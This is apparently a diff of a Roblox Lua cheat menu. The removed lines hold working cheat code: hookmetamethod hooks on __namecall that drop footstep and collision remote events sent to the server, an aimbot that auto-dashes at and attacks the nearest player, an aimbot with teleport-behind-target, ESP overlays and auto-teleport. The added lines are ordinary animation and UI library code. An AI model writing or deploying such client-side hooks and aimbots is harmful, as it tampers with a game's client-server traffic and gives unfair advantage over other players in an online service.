-        return partOrChar:FindFirstChild("HumanoidRootPart") or partOrChar:FindFirstChild("Torso") or partOrChar:FindFirstChild("UpperTorso")
-    end
-
-    --== 🔄 Movement follow camera ==--
-    local function onHeartbeat()
-        local char = Player.Character
-        -- giữ check c00lkidd như gốc (chỉ áp dụng cho mẫu c00lkidd)
-        if not char or char.Name ~= "c00lkidd" then return end
-        local root = getHumRoot(char)
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        local lv = root and root:FindFirstChild("LinearVelocity")
-        if not root or not hum or not lv then return end
-        lv.Enabled = false
-        if stopMovement then return end
-
-        local look = Camera and Camera.CFrame and Camera.CFrame.LookVector or nil
-        if look then
-            local dir = Vector3.new(look.X, 0, look.Z)
-            if dir.Magnitude > 0 then
-                dir = dir.Unit
-                root.Velocity = Vector3.new(dir.X * getgenv().walkSpeed, root.Velocity.Y, dir.Z * getgenv().walkSpeed)
-                root.CFrame = CFrame.new(root.Position, root.Position + dir)
-            end
-        end
-    end
-
-    --== 🧩 Hook Helpers ==--
-    getgenv().createHook = function(remoteName)
-        if getgenv()["original_" .. remoteName] then
-            return getgenv()["original_" .. remoteName]
-        end
-        getgenv()["original_" .. remoteName] = hookmetamethod(game, "__namecall", function(self, ...)
-            local method = getnamecallmethod()
-            local args = { ... }
-            if self == getgenv().Remote and method == "FireServer" then
-                if args[1] == Player.Name .. remoteName then
-                    return
-                end
-            end
-            return getgenv()["original_" .. remoteName](self, ...)
-        end)
-        return getgenv()["original_" .. remoteName]
-    end
-
-    getgenv().enableHook = function(remoteName)
-        if not getgenv()["hook_" .. remoteName] then
-            getgenv()["hook_" .. remoteName] = getgenv().createHook(remoteName)
-        end
-        if remoteName == "DusekkarCancel" and not getgenv().isFiringDusekkar then
-            getgenv().isFiringDusekkar = true
-            task.spawn(function()
-                task.wait(4)
-                getgenv().Remote:FireServer({ Player.Name .. "DusekkarCancel" })
-                getgenv().isFiringDusekkar = false
-                stopMovement = false
-                cancelStopTimeout()
-            end)
-        end
-    end
-
-    getgenv().disableHook = function(remoteName)
-        if getgenv()["hook_" .. remoteName] then
-            hookmetamethod(game, "__namecall", getgenv()["hook_" .. remoteName])
-            getgenv()["hook_" .. remoteName] = nil
-            getgenv()["original_" .. remoteName] = nil
-        end
-    end
-
-    --== 👣 Footstep Hook ==--
-    getgenv().HookFootstepPlayed = function(enable)
-        if enable then
-            if not getgenv().originalFootstepHook then
-                getgenv().originalFootstepHook = hookmetamethod(game, "__namecall", function(self, ...)
-                    local method = getnamecallmethod()
-                    local args = { ... }
-                    if method == "FireServer" and self.Name == "UnreliableRemoteEvent" then
-                        if args[1] == "FootstepPlayed" and getgenv().blockFootstepPlayed then
-                            return
-                        end
-                    end
-                    return getgenv().originalFootstepHook(self, ...)
-                end)
-            end
-            getgenv().blockFootstepPlayed = true
-        else
-            getgenv().blockFootstepPlayed = false
-        end
-    end
-
-    --== ⚔️ Combat GUI (Fluent style) ==--
-    Tabs.Main:AddToggle("WalkspeedOverride", {
-        Title = "Walkspeed Override Controller",
-        Default = false
-    }):OnChanged(function(value)
-        if value then
-            stopMovement = false
-            cancelStopTimeout()
-            if not getgenv().connection then
-                getgenv().connection = RunService.Heartbeat:Connect(onHeartbeat)
-            end
-        else
-            if getgenv().connection then
-                getgenv().connection:Disconnect()
-                getgenv().connection = nil
-            end
-        end
-    end)
-
-    Tabs.Main:AddToggle("IgnoreC00lkidd", {
-        Title = "Walkspeed Override Ignore Objectables",
-        Default = false
-    }):OnChanged(function(value)
-        if value then
-            getgenv().enableHook("C00lkiddCollision")
-        else
-            getgenv().disableHook("C00lkiddCollision")
-        end
-    end)
-
-    Tabs.Main:AddToggle("IgnoreFootstep", {
-        Title = "Block Footstep Played",
-        Default = false
-    }):OnChanged(function(value)
-        getgenv().HookFootstepPlayed(value)
-    end)
-
-    --== 🧩 New Toggle for Dusekkar ==
-    Tabs.Main:AddToggle("DusekkarMode", {
-        Title = "Anti Dusekarr Attack",
-        Default = false
-    }):OnChanged(function(value)
-        if value then
-            getgenv().enableHook("DusekkarCancel")
-        else
-            getgenv().disableHook("DusekkarCancel")
-        end
-    end)
-
-end
-
-
-
-
-    Tabs.Main:AddSection("Noli")
-
-do
-    local RunService = game:GetService("RunService")
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    -- ====== CONFIG ======
-    local voidrushcontrol = false
-    local DASH_SPEED = 80
-    local ATTACK_RANGE = 6
-    local ATTACK_INTERVAL = 0.2
-
-    -- ====== DYNAMIC PRIORITY ======
-    local survivorsFolder = workspace:WaitForChild("Players"):WaitForChild("Survivors")
-
-    local function isPriorityTarget(p)
-        if not p or not p.Character then return false end
-        return survivorsFolder:FindFirstChild(p.Name) ~= nil
-    end
-
-    -- ====== STATE ======
-    local isOverrideActive = false
-    local connection
-    local Humanoid, RootPart
-    local lastState = nil
-    local attackingLoop = nil
-
-    -- setup character
-    local function setupCharacter(character)
-        Humanoid = character:WaitForChild("Humanoid")
-        RootPart = character:WaitForChild("HumanoidRootPart")
-        Humanoid.Died:Connect(function()
-            stopOverride()
-        end)
-    end
-
-    if LocalPlayer.Character then
-        setupCharacter(LocalPlayer.Character)
-    end
-    LocalPlayer.CharacterAdded:Connect(setupCharacter)
-
-    -- tìm mục tiêu hợp lệ
-    local function validTarget(p)
-        if p == LocalPlayer then return false end
-        local c = p.Character
-        if not c then return false end
-        local hrp = c:FindFirstChild("HumanoidRootPart")
-        local hum = c:FindFirstChild("Humanoid")
-        return hrp and hum and hum.Health > 0
-    end
-
-    -- tìm player gần nhất (ưu tiên survivorsFolder)
-    local function getClosestTarget()
-        if not RootPart then return nil end
-
-        local closestW, distW = nil, math.huge
-        local closestA, distA = nil, math.huge
-
-        for _, p in ipairs(Players:GetPlayers()) do
-            if validTarget(p) then
-                local c = p.Character
-                local hrp = c and c:FindFirstChild("HumanoidRootPart")
-                if hrp then
-                    local d = (hrp.Position - RootPart.Position).Magnitude
-                    if isPriorityTarget(p) and d < distW then
-                        distW = d
-                        closestW = p
-                    end
-                    if d < distA then
-                        distA = d
-                        closestA = p
-                    end
-                end
-            end
-        end
-
-        return closestW or closestA, distW < math.huge and distW or distA
-    end
-
-    -- cố gắng tấn công (tool:Activate())
-    local function attemptAttack()
-        local char = LocalPlayer.Character
-        if not char then return end
-        local tool = char:FindFirstChildOfClass("Tool")
-        if tool and tool.Parent == char then
-            pcall(function() tool:Activate() end)
-        end
-    end
-
-    -- điều khiển Void Rush
-    local function startOverride()
-        if isOverrideActive or not Humanoid or not RootPart then return end
-        isOverrideActive = true
-
-        connection = RunService.RenderStepped:Connect(function()
-            if not Humanoid or not RootPart or Humanoid.Health <= 0 then return end
-            local target, dist = getClosestTarget()
-
-            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-                local hrp = target.Character.HumanoidRootPart
-                local dir = hrp.Position - RootPart.Position
-                local horizontal = Vector3.new(dir.X, 0, dir.Z)
-
-                if horizontal.Magnitude > 0.1 then
-                    RootPart.CFrame = CFrame.new(RootPart.Position, Vector3.new(hrp.Position.X, RootPart.Position.Y, hrp.Position.Z))
-                    RootPart.AssemblyLinearVelocity = horizontal.Unit * DASH_SPEED
-                else
-                    RootPart.AssemblyLinearVelocity = Vector3.zero
-                end
-            else
-                RootPart.AssemblyLinearVelocity = Vector3.zero
-            end
-        end)
-
-        attackingLoop = task.spawn(function()
-            while isOverrideActive do
-                local target, dist = getClosestTarget()
-                if target and dist and dist <= ATTACK_RANGE then
-                    attemptAttack()
-                end
-                task.wait(ATTACK_INTERVAL)
-            end
-        end)
-    end
-
-    function stopOverride()
-        if not isOverrideActive then return end
-        isOverrideActive = false
-        if connection then
-            connection:Disconnect()
-            connection = nil
-        end
-        if RootPart then
-            RootPart.AssemblyLinearVelocity = Vector3.zero
-        end
-    end
-
-    -- kiểm tra trạng thái void rush
-    RunService.RenderStepped:Connect(function()
-        if not voidrushcontrol or not Humanoid then return end
-        local state = Humanoid.Parent and Humanoid.Parent:GetAttribute("VoidRushState")
-        if state ~= lastState then
-            lastState = state
-            if state == "Dashing" then
-                startOverride()
-            else
-                stopOverride()
-            end
-        end
-    end)
-
-    -- toggle GUI
-    Tabs.Main:AddToggle("VoidRushControl", {
-        Title = "Void Rush Aimbot",
-        Default = false
-    }):OnChanged(function(v)
-        voidrushcontrol = v
-        if not v then stopOverride() end
-    end)
-end
-
-
-
-    Tabs.Main:AddSection("1x1x1x1")
-
-do
--- 🧩 GUI Toggle + Dropdown
-local toggleOn = false
-local toggleFlag = Instance.new("BoolValue")
-toggleFlag.Name = "1x1x1x1AutoAim_ToggleFlag"
-toggleFlag.Value = false
-
-local aimMode = "One Player"
-local predictMovement = false
-
-Tabs.Main:AddDropdown("AimModeDropdown", {
-    Title = "Aim Mode",
-    Values = {"One Player", "Multi Players", "Teleport"},
-    Default = "One Player",
-}):OnChanged(function(value)
-    aimMode = value
-end)
-
-Tabs.Main:AddToggle("AimSkill1x1x1x1", {
-    Title = "MassInfection Aimbot",
-    Default = toggleOn,
-}):OnChanged(function(state)
-    toggleOn = state
-    toggleFlag.Value = state
-end)
-
-Tabs.Main:AddToggle("PredictMovementToggle", {
-    Title = "Predict Movement",
-    Default = predictMovement,
-}):OnChanged(function(state)
-    predictMovement = state
-end)
-
--- ⚙️ Setup
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local localPlayer = Players.LocalPlayer
-local workspacePlayers = workspace:WaitForChild("Players")
-local survivorsFolder = workspacePlayers:WaitForChild("Survivors")
-
-local dangerousAnimations = {
-    ["131430497821198"] = true,
-    ["100592913030351"] = true,
-    ["70447634862911"]  = true,
-    ["83685305553364"] = true
-}
-
-local killerModels = {["1x1x1x1"] = true}
-
--- ⚡ State
-local autoRotateDisabledByScript = false
-local currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
-
--- 🧩 Utils
-local function isKiller()
-    local char = localPlayer.Character
-    return char and killerModels[char.Name] or false
-end
-
-local function getMyHumanoid()
-    local char = localPlayer.Character
-    return char and char:FindFirstChildWhichIsA("Humanoid")
-end
-
-local function restoreAutoRotate()
-    local hum = getMyHumanoid()
-    if hum and autoRotateDisabledByScript then
-        hum.AutoRotate = true
-        autoRotateDisabledByScript = false
-    end
-end
-
-local function isPlayingDangerousAnimation()
-    local humanoid = getMyHumanoid()
-    if not humanoid then return false end
-    local animator = humanoid:FindFirstChildOfClass("Animator")
-    if not animator then return false end
-
-    for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
-        local animId = tostring(track.Animation.AnimationId):match("%d+")
-        if animId and dangerousAnimations[animId] then
-            return true
-        end
-    end
-    return false
-end
-
--- 🧭 Tìm survivor gần nhất trong folder "Survivors"
-local function getClosestSurvivor()
-    local myHumanoid = getMyHumanoid()
-    if not myHumanoid then return nil end
-    local myRoot = myHumanoid.Parent and myHumanoid.Parent:FindFirstChild("HumanoidRootPart")
-    if not myRoot then return nil end
-
-    local closest, closestDist = nil, math.huge
-
-    for _, obj in ipairs(survivorsFolder:GetChildren()) do
-        if obj:IsA("Model") then
-            local hrp = obj:FindFirstChild("HumanoidRootPart")
-            local hum = obj:FindFirstChildWhichIsA("Humanoid")
-            if hrp and hum and hum.Health > 0 then
-                local dist = (hrp.Position - myRoot.Position).Magnitude
-                if dist < closestDist then
-                    closest = obj
-                    closestDist = dist
-                end
-            end
-        end
-    end
-    return closest
-end
-
--- 🌀 Reset khi respawn
-localPlayer.CharacterAdded:Connect(function()
-    task.delay(0.1, function()
-        autoRotateDisabledByScript = false
-    end)
-end)
-
--- 🔁 Main loop
-RunService.RenderStepped:Connect(function()
-    if not toggleFlag.Value then
-        restoreAutoRotate()
-        currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
-        return
-    end
-
-    if not isKiller() then
-        restoreAutoRotate()
-        currentTarget, isLockedOn, wasPlayingAnimation = nil, false, false
-        return
-    end
-
-    local myHumanoid = getMyHumanoid()
-    if not myHumanoid then return end
-    local myRoot = myHumanoid.Parent and myHumanoid.Parent:FindFirstChild("HumanoidRootPart")
-    if not myRoot then return end
-
-    local isPlaying = isPlayingDangerousAnimation()
-
-    -- Lock target 1 lần khi bắt đầu animation
-    if isPlaying and not isLockedOn then
-        currentTarget = getClosestSurvivor()
-        if currentTarget then isLockedOn = true end
-    end
-
-    -- Validate target
-    if isLockedOn and currentTarget then
-        local tHum = currentTarget:FindFirstChildWhichIsA("Humanoid")
-        local tHrp = currentTarget:FindFirstChild("HumanoidRootPart")
-        if (not tHum) or (tHum and tHum.Health <= 0) or (not tHrp) then
-            currentTarget, isLockedOn = nil, false
-        end
-    end
-
-    -- End animation
-    if (not isPlaying) and wasPlayingAnimation then
-        currentTarget, isLockedOn = nil, false
-        restoreAutoRotate()
-    end
-    wasPlayingAnimation = isPlaying
-
-    -- 🎯 Aim / Teleport
-    if isPlaying and isLockedOn and currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
-        local hrp = currentTarget.HumanoidRootPart
-        local targetPos = hrp.Position
-
-        if not autoRotateDisabledByScript then
-            myHumanoid.AutoRotate = false
-            autoRotateDisabledByScript = true
-        end
-
-        -- Predict movement
-        if predictMovement then
-            local vel = hrp.Velocity
-            if vel.Magnitude > 2 then
-                targetPos = targetPos + hrp.CFrame.LookVector * 3
-            end
-        end
-
-        local lookAt = Vector3.new(targetPos.X, myRoot.Position.Y, targetPos.Z)
-
-        if aimMode == "One Player" then
-            myRoot.CFrame = myRoot.CFrame:Lerp(CFrame.lookAt(myRoot.Position, lookAt), 0.99)
-
-        elseif aimMode == "Multi Players" then
-            local newTarget = getClosestSurvivor()
-            if newTarget then currentTarget = newTarget end
-            myRoot.CFrame = myRoot.CFrame:Lerp(CFrame.lookAt(myRoot.Position, lookAt), 0.99)
-
-        elseif aimMode == "Teleport" then
-            local behindPos = hrp.Position - hrp.CFrame.LookVector * 3
-            myRoot.CFrame = CFrame.new(behindPos, targetPos)
-        end
-    end
-end)
-end
-
-
--- Tabs.Event
-
-    Tabs.Event:AddSection("Halloween")
-
-
-do
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-
-    -- 📦 Nút Teleport riêng
-    Tabs.Event:AddButton({
-        Title = "TP to Shop",
-        Description = "Teleport đến khu Shop",
-        Callback = function()
-            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-            local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                hrp.CFrame = CFrame.new(-3540.36, -392.73, 231.53)
-            end
-        end,
-    })
-end
-
-
-local TeleportService = game:GetService("TeleportService")
-local Players = game:GetService("Players")
-
-Tabs.Event:AddButton({
-    Title = "Get Skin Sixer",
-    Callback = function()
-        pcall(function()
-            TeleportService:Teleport(139594300138069, Players.LocalPlayer)
-        end)
-    end
-})
-
-
--- 💙 8. SUKKARS / EVENT ESP (v3.2: chạm viền sẽ ẩn ESP)
------------------------------------------------------
-local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
-local allowedModels = {
-    ["dumsek"] = true,
-    ["toon dusek"] = true,
-    ["dusek"] = true,
-    ["umdum"] = true,
-    ["doothsek"] = true,
-}
-
-local blockedCenter = Vector3.new(-3485.02, 4.48, 217.77)
-local blockedRadius = 500
-
-_G.ESPManager:RegisterType("Sukkars", Color3.fromRGB(0, 85, 255), function(obj)
-    if not obj:IsA("Model") then return false end
-    if not allowedModels[string.lower(obj.Name)] then return false end
-
-    local part = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")
-    if not part then return false end
-
-    local dist = (part.Position - blockedCenter).Magnitude
-    if dist <= blockedRadius then return false end
-
-    return true
-end, false)
-
--- ⚡ Gắn .Touched 1 lần duy nhất
-local oldCreate = _G.ESPManager.Create
-_G.ESPManager.Create = function(self, model, typeName)
-    oldCreate(self, model, typeName)
-
-    if typeName == "Sukkars" then
-        local hrp = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
-        if hrp and not hrp:FindFirstChild("_TouchedFlag") then
-            local flag = Instance.new("BoolValue")
-            flag.Name = "_TouchedFlag"
-            flag.Parent = hrp
-
-            hrp.Touched:Connect(function(hit)
-                local char = LocalPlayer.Character
-                if char and hit:IsDescendantOf(char) then
-                    _G.ESPManager:Remove(model)
-                end
-            end)
-        end
-    end
-end
-
--- 💫 Ẩn ESP khi “chạm viền” (cự ly cực gần)
-task.spawn(function()
-    while task.wait(0.15) do
-        local char = LocalPlayer.Character
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-        if not hrp then continue end
-
-        for model, data in pairs(_G.ESPManager.Objects) do
-            if data.type == "Sukkars" then
-                local part = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
-                if part then
-                    local dist = (hrp.Position - part.Position).Magnitude
-                    if dist <= 5 then -- 👈 khoảng cách “chạm viền”
-                        _G.ESPManager:Remove(model)
-                    elseif dist > 1200 then -- xa quá thì dọn ESP
-                        _G.ESPManager:Remove(model)
-                    end
-                else
-                    _G.ESPManager:Remove(model)
-                end
-            end
-        end
-    end
-end)
-
-Tabs.Event:AddToggle("ESPSukkarsToggle", {
-    Title = "ESP Sukkars",
-    Default = false,
-}):OnChanged(function(state)
-    _G.ESPManager:SetEnabled("Sukkars", state)
-end)
-
-
-
--- 🧭 Danh sách model cần teleport tới
-local TargetNames = {
-    "dumsek",
-    "toon dusek",
-    "umdum",
-    "dusek",
-    "doothsek",
-}
-
--- ⚙️ Cài đặt
-local ScanInterval = 0.5
-local TeleportDelay = 0.25
-local HeightSafe = 5
-local IgnoreCenter = Vector3.new(-3485.02, 4.48, 217.77)
-local IgnoreRadius = 500
-
--- ⚡ Biến điều khiển
-local autoTeleport = false
-local visitedModels = {}
-local currentTarget = nil
-
--- === SERVICES ===
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- === HÀM HỖ TRỢ ===
-local function getHumanoid()
-	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-	return char:FindFirstChildOfClass("Humanoid"), char
-end
-
-local function getModelCFrame(model)
-	if not model or not model:IsDescendantOf(workspace) then return end
-	local part = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
-	if part then
-		return part.CFrame
-	elseif model.GetPivot then
-		local ok, pivot = pcall(function()
-			return model:GetPivot()
-		end)
-		if ok then return pivot end
-	end
-end
-
-local function isValidModel(model)
-	if not model or not model:IsDescendantOf(workspace) then
+local function isMotor(value)
+	local motorType = tostring(value):match("^Motor%((.+)%)$")
+
+	if motorType then
+		return true, motorType
+	else
 		return false
 	end
-	for _, name in ipairs(TargetNames) do
-		if model.Name:lower() == name:lower() then
-			local cf = getModelCFrame(model)
-			if cf then
-				local pos = cf.Position
-				if (pos - IgnoreCenter).Magnitude > IgnoreRadius then
-					return true
+end
+
+local Connection = {}
+
+Connection.__index = Connection
+
+function Connection.new(signal, handler)
+	return setmetatable({
+		signal = signal,
+		connected = true,
+		_handler = handler,
+	}, Connection)
+end
+
+function Connection:disconnect()
+	if self.connected then
+		self.connected = false
+
+		for index, connection in pairs(self.signal._connections) do
+			if connection == self then
+				table.remove(self.signal._connections, index)
+				return
+			end
+		end
+	end
+end
+
+local Signal = {}
+Signal.__index = Signal
+
+function Signal.new()
+	return setmetatable({
+		_connections = {},
+		_threads = {},
+	}, Signal)
+end
+
+function Signal:fire(...)
+	for _, connection in pairs(self._connections) do
+		connection._handler(...)
+	end
+
+	for _, thread in pairs(self._threads) do
+		coroutine.resume(thread, ...)
+	end
+
+	self._threads = {}
+end
+
+function Signal:connect(handler)
+	local connection = Connection.new(self, handler)
+	table.insert(self._connections, connection)
+	return connection
+end
+
+function Signal:wait()
+	table.insert(self._threads, coroutine.running())
+	return coroutine.yield()
+end
+
+local Linear = {}
+Linear.__index = Linear
+
+function Linear.new(targetValue, options)
+	assert(targetValue, "Missing argument #1: targetValue")
+
+	options = options or {}
+
+	return setmetatable({
+		_targetValue = targetValue,
+		_velocity = options.velocity or 1,
+	}, Linear)
+end
+
+function Linear:step(state, dt)
+	local position = state.value
+	local velocity = self._velocity
+	local goal = self._targetValue
+
+	local dPos = dt * velocity
+
+	local complete = dPos >= math.abs(goal - position)
+	position = position + dPos * (goal > position and 1 or -1)
+	if complete then
+		position = self._targetValue
+		velocity = 0
+	end
+
+	return {
+		complete = complete,
+		value = position,
+		velocity = velocity,
+	}
+end
+
+local Instant = {}
+Instant.__index = Instant
+
+function Instant.new(targetValue)
+	return setmetatable({
+		_targetValue = targetValue,
+	}, Instant)
+end
+
+function Instant:step()
+	return {
+		complete = true,
+		value = self._targetValue,
+	}
+end
+
+local VELOCITY_THRESHOLD = 0.001
+local POSITION_THRESHOLD = 0.001
+
+local EPS = 0.0001
+
+local Spring = {}
+Spring.__index = Spring
+
+function Spring.new(targetValue, options)
+	assert(targetValue, "Missing argument #1: targetValue")
+	options = options or {}
+
+	return setmetatable({
+		_targetValue = targetValue,
+		_frequency = options.frequency or 4,
+		_dampingRatio = options.dampingRatio or 1,
+	}, Spring)
+end
+
+function Spring:step(state, dt)
+
+
+	local d = self._dampingRatio
+	local f = self._frequency * 2 * math.pi
+	local g = self._targetValue
+	local p0 = state.value
+	local v0 = state.velocity or 0
+
+	local offset = p0 - g
+	local decay = math.exp(-d * f * dt)
+
+	local p1, v1
+
+	if d == 1 then
+		p1 = (offset * (1 + f * dt) + v0 * dt) * decay + g
+		v1 = (v0 * (1 - f * dt) - offset * (f * f * dt)) * decay
+	elseif d < 1 then
+		local c = math.sqrt(1 - d * d)
+
+		local i = math.cos(f * c * dt)
+		local j = math.sin(f * c * dt)
+
+
+
+		local z
+		if c > EPS then
+			z = j / c
+		else
+			local a = dt * f
+			z = a + ((a * a) * (c * c) * (c * c) / 20 - c * c) * (a * a * a) / 6
+		end
+
+
+
+		local y
+		if f * c > EPS then
+			y = j / (f * c)
+		else
+			local b = f * c
+			y = dt + ((dt * dt) * (b * b) * (b * b) / 20 - b * b) * (dt * dt * dt) / 6
+		end
+
+		p1 = (offset * (i + d * z) + v0 * y) * decay + g
+		v1 = (v0 * (i - z * d) - offset * (z * f)) * decay
+	else
+		local c = math.sqrt(d * d - 1)
+
+		local r1 = -f * (d - c)
+		local r2 = -f * (d + c)
+
+		local co2 = (v0 - offset * r1) / (2 * f * c)
+		local co1 = offset - co2
+
+		local e1 = co1 * math.exp(r1 * dt)
+		local e2 = co2 * math.exp(r2 * dt)
+
+		p1 = e1 + e2 + g
+		v1 = e1 * r1 + e2 * r2
+	end
+
+	local complete = math.abs(v1) < VELOCITY_THRESHOLD and math.abs(p1 - g) < POSITION_THRESHOLD
+
+	return {
+		complete = complete,
+		value = complete and g or p1,
+		velocity = v1,
+	}
+end
+
+local noop = function() end
+
+local BaseMotor = {}
+BaseMotor.__index = BaseMotor
+
+function BaseMotor.new()
+	return setmetatable({
+		_onStep = Signal.new(),
+		_onStart = Signal.new(),
+		_onComplete = Signal.new(),
+	}, BaseMotor)
+end
+
+function BaseMotor:onStep(handler)
+	return self._onStep:connect(handler)
+end
+
+function BaseMotor:onStart(handler)
+	return self._onStart:connect(handler)
+end
+
+function BaseMotor:onComplete(handler)
+	return self._onComplete:connect(handler)
+end
+
+function BaseMotor:start()
+	if not self._connection then
+		self._connection = RunService.RenderStepped:Connect(function(deltaTime)
+			self:step(deltaTime)
+		end)
+	end
+end
+
+function BaseMotor:stop()
+	if self._connection then
+		self._connection:Disconnect()
+		self._connection = nil
+	end
+end
+BaseMotor.destroy = BaseMotor.stop
+
+BaseMotor.step = noop
+BaseMotor.getValue = noop
+BaseMotor.setGoal = noop
+
+function BaseMotor:__tostring()
+	return "Motor"
+end
+
+local SingleMotor = setmetatable({}, BaseMotor)
+SingleMotor.__index = SingleMotor
+
+function SingleMotor.new(initialValue, useImplicitConnections)
+	assert(initialValue, "Missing argument #1: initialValue")
+	assert(typeof(initialValue) == "number", "initialValue must be a number!")
+
+	local self = setmetatable(BaseMotor.new(), SingleMotor)
+
+	if useImplicitConnections ~= nil then
+		self._useImplicitConnections = useImplicitConnections
+	else
+		self._useImplicitConnections = true
+	end
+
+	self._goal = nil
+	self._state = {
+		complete = true,
+		value = initialValue,
+	}
+
+	return self
+end
+
+function SingleMotor:step(deltaTime)
+	if self._state.complete then
+		return true
+	end
+
+	local newState = self._goal:step(self._state, deltaTime)
+
+	self._state = newState
+	self._onStep:fire(newState.value)
+
+	if newState.complete then
+		if self._useImplicitConnections then
+			self:stop()
+		end
+
+		self._onComplete:fire()
+	end
+
+	return newState.complete
+end
+
+function SingleMotor:getValue()
+	return self._state.value
+end
+
+function SingleMotor:setGoal(goal)
+	self._state.complete = false
+	self._goal = goal
+
+	self._onStart:fire()
+
+	if self._useImplicitConnections then
+		self:start()
+	end
+end
+
+function SingleMotor:__tostring()
+	return "Motor(Single)"
+end
+
+local GroupMotor = setmetatable({}, BaseMotor)
+GroupMotor.__index = GroupMotor
+
+local function toMotor(value)
+	if isMotor(value) then
+		return value
+	end
+
+	local valueType = typeof(value)
+
+	if valueType == "number" then
+		return SingleMotor.new(value, false)
+	elseif valueType == "table" then
+		return GroupMotor.new(value, false)
+	end
+
+	error(("Unable to convert %q to motor; type %s is unsupported"):format(value, valueType), 2)
+end
+
+function GroupMotor.new(initialValues, useImplicitConnections)
+	assert(initialValues, "Missing argument #1: initialValues")
+	assert(typeof(initialValues) == "table", "initialValues must be a table!")
+	assert(
+		not initialValues.step,
+		'initialValues contains disallowed property "step". Did you mean to put a table of values here?'
+	)
+
+	local self = setmetatable(BaseMotor.new(), GroupMotor)
+
+	if useImplicitConnections ~= nil then
+		self._useImplicitConnections = useImplicitConnections
+	else
+		self._useImplicitConnections = true
+	end
+
+	self._complete = true
+	self._motors = {}
+
+	for key, value in pairs(initialValues) do
+		self._motors[key] = toMotor(value)
+	end
+
+	return self
+end
+
+function GroupMotor:step(deltaTime)
+	if self._complete then
+		return true
+	end
+
+	local allMotorsComplete = true
+
+	for _, motor in pairs(self._motors) do
+		local complete = motor:step(deltaTime)
+		if not complete then
+
+			allMotorsComplete = false
+		end
+	end
+
+	self._onStep:fire(self:getValue())
+
+	if allMotorsComplete then
+		if self._useImplicitConnections then
+			self:stop()
+		end
+
+		self._complete = true
+		self._onComplete:fire()
+	end
+
+	return allMotorsComplete
+end
+
+function GroupMotor:setGoal(goals)
+	assert(not goals.step, 'goals contains disallowed property "step". Did you mean to put a table of goals here?')
+
+	self._complete = false
+	self._onStart:fire()
+
+	for key, goal in pairs(goals) do
+		local motor = assert(self._motors[key], ("Unknown motor for key %s"):format(key))
+		motor:setGoal(goal)
+	end
+
+	if self._useImplicitConnections then
+		self:start()
+	end
+end
+
+function GroupMotor:getValue()
+	local values = {}
+
+	for key, motor in pairs(self._motors) do
+		values[key] = motor:getValue()
+	end
+
+	return values
+end
+
+function GroupMotor:__tostring()
+	return "Motor(Group)"
+end
+
+local Flipper = {
+	SingleMotor = SingleMotor,
+	GroupMotor = GroupMotor,
+
+	Instant = Instant,
+	Linear = Linear,
+	Spring = Spring,
+
+	isMotor = isMotor,
+}
+
+local Creator = {
+	Registry = {},
+	Signals = {},
+	TransparencyMotors = {},
+	DefaultProperties = {
+		ScreenGui = {
+			ResetOnSpawn = false,
+			ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+		},
+		Frame = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			BorderSizePixel = 0,
+		},
+		ScrollingFrame = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			ScrollBarImageColor3 = Color3.new(0, 0, 0),
+		},
+		TextLabel = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			Font = Enum.Font.SourceSans,
+			Text = "",
+			TextColor3 = Color3.new(0, 0, 0),
+			BackgroundTransparency = 1,
+			TextSize = 14,
+		},
+		TextButton = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			AutoButtonColor = false,
+			Font = Enum.Font.SourceSans,
+			Text = "",
+			TextColor3 = Color3.new(0, 0, 0),
+			TextSize = 14,
+		},
+		TextBox = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			ClearTextOnFocus = false,
+			Font = Enum.Font.SourceSans,
+			Text = "",
+			TextColor3 = Color3.new(0, 0, 0),
+			TextSize = 14,
+		},
+		ImageLabel = {
+			BackgroundTransparency = 1,
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			BorderSizePixel = 0,
+		},
+		ImageButton = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			AutoButtonColor = false,
+		},
+		CanvasGroup = {
+			BackgroundColor3 = Color3.new(1, 1, 1),
+			BorderColor3 = Color3.new(0, 0, 0),
+			BorderSizePixel = 0,
+		},
+	},
+}
+
+local function ApplyCustomProps(Object, Props)
+	if Props.ThemeTag then
+		Creator.AddThemeObject(Object, Props.ThemeTag)
+	end
+end
+
+function Creator.AddSignal(Signal, Function)
+	local Connected = Signal:Connect(Function)
+	table.insert(Creator.Signals, Connected)
+	return Connected
+end
+
+function Creator.Disconnect()
+	for Idx = #Creator.Signals, 1, -1 do
+		local Connection = table.remove(Creator.Signals, Idx)
+		if Connection.Disconnect then
+			Connection:Disconnect()
+		end
+	end
+end
+
+Creator.Themes = Themes
+Creator.Theme = Creator.Theme or "Dark"
+
